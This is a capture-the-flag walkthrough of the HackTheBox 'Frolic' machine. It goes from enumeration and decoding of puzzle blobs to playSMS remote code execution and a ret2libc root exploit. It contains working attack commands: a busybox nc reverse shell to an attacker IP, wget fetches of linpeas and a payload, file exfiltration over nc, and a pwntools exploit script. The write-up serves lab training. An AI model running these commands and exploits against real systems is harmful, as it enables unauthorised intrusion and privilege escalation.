# Frolic: Easy

```sh
sudo vim /etc/hosts
# add frolic.htb

nmap -T4 -p- -A -Pn -v frolic.htb
```

* open ports & services:

    * 22/tcp: ssh: OpenSSH 7.2p2 Ubuntu 4ubuntu2.4
    * 139/tcp: netbios-ssn: Samba smbd 3.X: 4.X
    * 445/tcp: netbios-ssn: Samba smbd 4.3.11-Ubuntu
    * 1880/tcp: http: Node.js (Express middleware)
    * 9999/tcp: http: nginx 1.10.3

* ```nmap``` also detects the SMB OS as Windows 6.1 (Samba 4.3.11-Ubuntu), and shows that 'guest' account is used

* enumerating SMB:

    ```sh
    smbmap -H frolic.htb
    # lists 'print$' and 'IPC$' shares

    enum4linux-ng frolic.htb -A
    # lists domain password info
    # this also shows 'rpcclient' enum is possible

    smbclient -N -L //frolic.htb

    crackmapexec smb frolic.htb --shares -u '' -p ''

    crackmapexec smb frolic.htb --shares -u 'Guest' -p ''

    rpcclient -U "" frolic.htb
    # we can login

    querydominfo

    netshareenumall

    netsharegetinfo print$

    netsharegetinfo ipc$

    # other common queries do not work

    exit

    samrdump.py frolic.htb
    # no info retrieved
    ```

* the domain password policy is listed using ```enum4linux```, and it shows the minimum password length is 5; other tools do not find any useful info

* checking the webpage on port 1880, we have a login page for Node-RED; the source code gives the version 0.19.4

* Google shows that Node-RED is a flow-based, low-code dev tool for visual programming

* trying default creds in the login page like 'admin:admin' does not work; 'admin:password' seems to cause the login page to load for a while, but login still fails

* checking the webpage on port 9999, we have the landing page for nginx web server; it does not have any other details

* searching for exploits related to nginx 1.10.3 leads to an overflow vulnerability, but it does not seem to be of use for this box

* searching for exploits related to Node-RED 0.19.4 does not lead to any specific exploits, but gives methods for getting RCE after authentication

* web enumeration:

    ```sh
    feroxbuster -u http://frolic.htb:1880 -w /usr/share/wordlists/dirb/common.txt -x txt,php,html,js,md --extract-links --scan-limit 3 --filter-status 400,401,404,405,500 --silent
    # dir scan for node red page

    feroxbuster -u http://frolic.htb:9999 -w /usr/share/wordlists/dirb/common.txt -x txt,php,html,js,md --extract-links --scan-limit 3 --filter-status 400,401,404,405,500 --silent
    # dir scan for nginx page

    ffuf -c -u 'http://frolic.htb:1880' -H 'Host: FUZZ.frolic.htb' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 20 -fs 7312 -s
    # subdomain scan for port 1880 webpage

    ffuf -c -u 'http://frolic.htb:9999' -H 'Host: FUZZ.frolic.htb' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 20 -fs 637 -s
    # subdomain scan for port 9999 webpage
    ```

* the directory scan for the nginx page at 'http://frolic.htb:9999' gives several findings:

    * /admin
    * /backup
    * /dev
    * /test
    * /backup/password.txt
    * /backup/user.txt
    * /dev/backup
    * /dev/test

* 'http://frolic.htb:9999/test/' contains the default PHP landing page for PHP version 7.0.32-0ubuntu0.16.04.1

* 'http://frolic.htb:9999/admin/' leads to a login page and mentions that it can be hacked

* the source code for this page mentions a JS script at 'http://frolic.htb:9999/admin/js/login.js', which contains the logic for the login page; it also discloses the creds 'admin:superduperlooperpassword_lol'

* we can login using these creds and it leads to 'http://frolic.htb:9999/admin/success.html': this contains a cryptic blob of text, containing only periods, question marks and exclamation marks; we can check if this can be decoded

* navigating to 'http://frolic.htb:9999/backup', we get a listing for 3 pages: 'password.txt', 'user.txt', and 'loop/'

* 'password.txt' gives the password 'imnothuman', 'user.txt' gives the username 'admin', and 'loop/' gives the 403 Forbidden message

* we get the 403 Forbidden message when checking 'http://frolic.htb:9999/dev/' as well

* however, if we check the nested page 'http://frolic.htb:9999/dev/test': this leads to a file download, but it just contains the word 'test'

* if we check the other nested page 'http://frolic.htb:9999/dev/backup', it mentions a directory '/playsms'

* navigating to 'http://frolic.htb:9999/playsms', we get a login page for the playSMS webapp at 'http://frolic.htb:9999/playsms/index.php?app=main&inc=core_auth&route=login'

* here, if we try the creds discovered so far: 'admin:imnothuman', 'admin:admin', 'admin:superduperlooperpassword_lol': the login fails

* we can try Googling for exploits associated with playSMS, and this leads to [CVE-2017-9101: an authenticated RCE exploit](https://www.exploit-db.com/exploits/42044)

* before trying the exploit, the steps mentioned give a method to register a user: by navigating to 'index.php?app=main&inc=core_auth&route=register'

* following this step, we can create a user in our instance by navigating to 'http://frolic.htb:9999/playsms/index.php?app=main&inc=core_auth&route=register': but this shows the error message 'account registration is not available'

* we can try using the creds found earlier for accessing the SMB shares, but the creds do not help here

* navigating back to the encoded text blob at 'http://frolic.htb:9999/admin/success.html', we have the following text at hand:

    ```text
    ..... ..... ..... .!?!! .?... ..... ..... ...?. ?!.?. ..... ..... ..... ..... ..... ..!.? ..... ..... .!?!! .?... ..... ..?.? !.?.. ..... ..... ....! ..... ..... .!.?. ..... .!?!! .?!!! !!!?. ?!.?! !!!!! !...! ..... ..... .!.!! !!!!! !!!!! !!!.? ..... ..... ..... ..!?! !.?!! !!!!! !!!!! !!!!? .?!.? !!!!! !!!!! !!!!! .?... ..... ..... ....! ?!!.? ..... ..... ..... .?.?! .?... ..... ..... ...!. !!!!! !!.?. ..... .!?!! .?... ...?. ?!.?. ..... ..!.? ..... ..!?! !.?!! !!!!? .?!.? !!!!! !!!!. ?.... ..... ..... ...!? !!.?! !!!!! !!!!! !!!!! ?.?!. ?!!!! !!!!! !!.?. ..... ..... ..... .!?!! .?... ..... ..... ...?. ?!.?. ..... !.... ..... ..!.! !!!!! !.!!! !!... ..... ..... ....! .?... ..... ..... ....! ?!!.? !!!!! !!!!! !!!!! !?.?! .?!!! !!!!! !!!!! !!!!! !!!!! .?... ....! ?!!.? ..... .?.?! .?... ..... ....! .?... ..... ..... ..!?! !.?.. ..... ..... ..?.? !.?.. !.?.. ..... ..!?! !.?.. ..... .?.?! .?... .!.?. ..... .!?!! .?!!! !!!?. ?!.?! !!!!! !!!!! !!... ..... ...!. ?.... ..... !?!!. ?!!!! !!!!? .?!.? !!!!! !!!!! !!!.? ..... ..!?! !.?!! !!!!? .?!.? !!!.! !!!!! !!!!! !!!!! !.... ..... ..... ..... !.!.? ..... ..... .!?!! .?!!! !!!!! !!?.? !.?!! !.?.. ..... ....! ?!!.? ..... ..... ?.?!. ?.... ..... ..... ..!.. ..... ..... .!.?. ..... ...!? !!.?! !!!!! !!?.? !.?!! !!!.? ..... ..!?! !.?!! !!!!? .?!.? !!!!! !!.?. ..... ...!? !!.?. ..... ..?.? !.?.. !.!!! !!!!! !!!!! !!!!! !.?.. ..... ..!?! !.?.. ..... .?.?! .?... .!.?. ..... ..... ..... .!?!! .?!!! !!!!! !!!!! !!!?. ?!.?! !!!!! !!!!! !!.!! !!!!! ..... ..!.! !!!!! !.?. 
    ```

* Googling for relevant ciphers or encoding algorithms do not give anything that fits the description

* checking for any esoteric languages, we can try checking this with the Brainfuck language, as the hint suggests this is an [esoteric variant of Brainfuck programming language](https://esolangs.org/wiki/Category:Brainfuck_equivalents)

* using Google and ChatGPT, we are able to determine that this variant follows the [Short Ook! programming language](https://www.cachesleuth.com/bfook.html)

* we can decode this message using the 'Short Ook! to text' decode option, and this gives us the message "Nothing here check /asdiSIAJJ0QWE9JAS"

* now, if we navigate to 'http://frolic.htb:9999/asdiSIAJJ0QWE9JAS/', we get another encoded text blob: submitting this in [CyberChef](https://cyberchef.org) auto-detects the file type as a PKZIP archive (base64)

* Googling for more info on this file type, we get tools for [decoding base64 to file](https://base64.guru/converter/decode/file): we can submit the base64-encoded blob here, and this gives us a ZIP file to download

* we can now check the ZIP file for any info:

    ```sh
    file application.zip

    unzip application.zip
    # this requires a password

    # we can crack it using zip2john

    zip2john application.zip > ziphash

    john --wordlist=/usr/share/wordlists/rockyou.txt ziphash
    # this gives the cleartext 'password'

    unzip application.zip

    less index.php
    ```

* using ```zip2john```, we are able to crack the ZIP file with the cleartext 'password', and extracting it gives us the file 'index.php'

* 'index.php' contains another encoded blob of text; CyberChef auto-decodes this using the 'From Hex' recipe, indicating that this is hex data: and the decoded text looks like gibberish:

    ```text
    KysrKysgKysrKysgWy0+KysgKysrKysgKysrPF0gPisrKysgKy4tLS0gLS0uKysgKysrKysgLjwr
    KysgWy0+KysgKzxdPisKKysuPCsgKytbLT4gLS0tPF0gPi0tLS0gLS0uLS0gLS0tLS0gLjwrKysg
    K1stPisgKysrPF0gPisrKy4gPCsrK1sgLT4tLS0KPF0+LS0gLjwrKysgWy0+KysgKzxdPisgLi0t
    LS4gPCsrK1sgLT4tLS0gPF0+LS0gLS0tLS4gPCsrKysgWy0+KysgKys8XT4KKysuLjwgCg==
    ```

* the two equal signs ```==``` at the end of the blob indicate that this could be base64 (or equivalent) encoded text: and if we decode this text from Base64, we get the following:

    ```bf
    +++++ +++++ [->++ +++++ +++<] >++++ +.--- --.++ +++++ .<+++ [->++ +<]>+
    ++.<+ ++[-> ---<] >---- --.-- ----- .<+++ +[->+ +++<] >+++. <+++[ ->---
    <]>-- .<+++ [->++ +<]>+ .---. <+++[ ->--- <]>-- ----. <++++ [->++ ++<]>
    ++..< 
    ```

* this is again Brainfuck language; we can use an [online brainfuck decoder](https://md5decrypt.net/en/Brainfuck-translator/) to decrypt this

* decoding the Brainfuck code gives us the text 'idkwhatispass'

* we do not have any other info, so we can try using this as a password for the PlaySMS login page

* if we try the creds 'admin:idkwhatispass' in the playSMS login page at 'http://frolic.htb:9999/playsms', it works and we get access to the welcome page

* as we have authenticated access, we can attempt the exploit for CVE-2017-9101: we can use the ```metasploit``` module for this:

    ```sh
    msfconsole -q

    search playsms

    use exploit/multi/http/playsms_uploadcsv_exec

    options

    set PASSWORD idkwhatispass
    set RPORT 9999
    set TARGETURI playsms/
    set RHOSTS frolic.htb
    set LHOST 10.10.14.95
    run
    # this gives us a meterpreter shell
    ```

* in meterpreter shell, we can launch a shell for convenience:

    ```sh
    shell
    # launches shell

    id
    # www-data

    pwd
    # '/var/www/html/playsms'

    ls -la
    # check all files

    cat config.php
    # discloses creds 'root:ayush' for 'playsms' MySQL DB

    ls -la /var/www/html
    # check other pages

    ls -la /var/www/html/playsms-1.4.2/
    # check for any other secrets

    ls -la /

    ls -la /home
    # users 'ayush' and 'sahay'

    ls -la /home/ayush

    cat /home/ayush/user.txt
    # user flag

    ls -la /home/sahay
    ```

* the 'config.php' file for playSMS discloses the MySQL creds 'root:ayush': we can try using these creds to check the MySQL DB but it does not contain any useful info

* also, the box has two standard users 'ayush' & 'sahay': checking their home directories does not give any useful info

* we can try enumerating further using ```linpeas``` - fetch the script from attacker:

    ```sh
    wget http://10.10.14.95:8000/linpeas.sh

    chmod +x linpeas.sh

    ./linpeas.sh
    ```

* findings from ```linpeas```:

    * Linux version 4.4.0-116-generic, Ubuntu 16.04.4
    * multiple kernel exploits like CVE-2016-5195 (dirtycow) highlighted
    * unknown SUID binary ```/home/ayush/.binary/rop``` found

* we can try the [dirtycow exploit](https://github.com/firefart/dirtycow), but it does not work

* we can try checking the SUID binary:

    ```sh
    strings /home/ayush/.binary/rop
    # no secrets or passwords

    /home/ayush/.binary/rop
    # this needs a working shell prompt
    ```

* as we need a working shell prompt to interact with the 'rop' program, we need to upgrade our shell: this is not possible in meterpreter shell as it can break it, so we can setup another listener and get a reverse shell there:

    ```sh
    # on attacker, setup listener
    nc -nvlp 5555
    ```
    
    ```sh
    # in meterpreter shell
    # use a reverse-shell one-liner payload
    busybox nc 10.10.14.95 5555 -e sh
    ```

* this works and we get a reverse shell on our new listener:

    ```sh
    # stabilise shell

    python3 -c 'import pty;pty.spawn("/bin/bash")'
    export TERM=xterm
    # Ctrl+Z
    stty raw -echo;fg
    # Enter twice

    cd /home/ayush/binary

    file rop
    # setuid ELF 32-bit LSB executable

    ./rop
    # it shows usage as 'program <message>'

    ./rop AAA
    # sends the message 'AAA'

    ./rop AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
    # sending a long message crashes the program
    # 'Segmentation fault (core dumped)'
    ```

* as the binary name suggests, we can check for binary exploitation using overflow techniques

* to check the binary using ```gdb```, we need to transfer this to attacker:

    ```sh
    # on attacker
    nc -nvlp 6666 > rop
    ```

    ```sh
    # on target
    nc 10.10.14.95 6666 -w 3 < rop
    ```

    ```sh
    # on attacker
    ls -la rop
    # verify transfer is complete

    chmod +x rop
    ```

* to exploit the binary, we can try buffer overflow methods like [ret2libc](https://ir0nstone.gitbook.io/notes/binexp/stack/return-oriented-programming/ret2libc) and [ROP exploits](https://blog.kuhi.to/rop-with-one-gadget/):

    * on target, verify ASLR is disabled as a prerequisite:

        ```sh
        cat /proc/sys/kernel/randomize_va_space
        # value is '0' - this means it is disabled
        ```
    
    * get ```libc``` and its base address:

        ```sh
        # on target
        ldd rop
        ```
    
    * the output shows that ```libc.so.6``` with the path ```/lib/i386-linux-gnu/libc.so.6``` is having base address '0xb7e19000'

    * next, get the location of ```system()``` and ```exit()```:

        ```sh
        readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system

        readelf -s /lib/i386-linux-gnu/libc.so.6 | grep exit
        ```
    
    * the output shows that the offset of system from libc base is '0003ada0': '0x03ada0' in hex; similarly, for exit, it is '0x02e9d0'

    * next, we need to get the location of ```/bin/sh```:

        ```sh
        strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh
        # '-a' to scan entire file
        # '-t x' to output offset in hex format
        ```
    
    * this gives the location '15ba0b'

    * now, on attacker, use ```gdb``` to determine the offset for RIP, where the program crashes:

        ```sh
        gdb ./rop
        # for debugging

        # in another shell, generate a random pattern of 100 chars to crash the program
        /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 100
        # copy the string for testing

        # in gdb
        r 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A'
        # use the 'run' command with the string
        # this crashes the program with 'segmentation fault'

        # note the address for finding the pattern offset - in this case it is '0x62413762'

        # find the offset
        /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 100 -q 0x62413762
        # this shows 'exact match at offset 52'
        ```
    
    * as we have the offset value 52 now, we can create the payload:

        ```sh
        # on attacker
        vim exploit.py
        ```

        ```py
        from pwn import *
        
        libc_base = 0xb7e19000
        system = libc_base + 0x03ada0
        exit = libc_base + 0x02e9d0
        binsh = libc_base + 0x15ba0b

        payload = b'A' * 52
        payload += p32(system)
        payload += p32(exit)
        payload += p32(0x0)
        payload += p32(binsh)

        f = open("payload.txt","wb")
        f.write(payload)
        f.close()
        ```

        ```sh
        python3 exploit.py
        # this writes the payload to a file
        ```
    
    * once the payload is ready from the exploit script, we can fetch it on the target: this is to be used as the argument for the 'rop' binary:

        ```sh
        # on target

        cd /tmp

        wget http://10.10.14.95:8000/payload.txt

        # use the payload as an argument for the binary
        /home/ayush/.binary/rop $(cat payload.txt)
        # this gives root shell

        id
        # root

        cat /root/root.txt
        # root flag
        ```
